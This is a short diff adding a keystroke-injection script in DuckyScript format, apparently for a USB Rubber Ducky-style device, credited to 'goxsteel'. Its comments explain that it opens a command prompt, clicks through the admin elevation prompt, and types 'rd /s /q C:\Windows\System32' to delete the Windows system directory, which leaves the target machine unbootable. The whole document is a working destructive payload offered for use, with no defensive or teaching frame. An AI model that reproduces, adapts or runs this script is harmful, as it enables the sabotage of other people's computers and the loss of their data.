@@ -1,0 +1,21 @@
+REM code by goxsteel
+REM published 2-1-2025
+REM may need to change the delays to match slower devices
+
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 600
+LEFTARROW
+DELAY 200
+ENTER
+REM opens command prompt as admin
+DELAY 400
+STRING rd /s /q C:\Windows\System32
+REM deletes system 32
+ENTER
+
+
+REM if code does not work, i don't plan on fixing it. But let me know anyway.
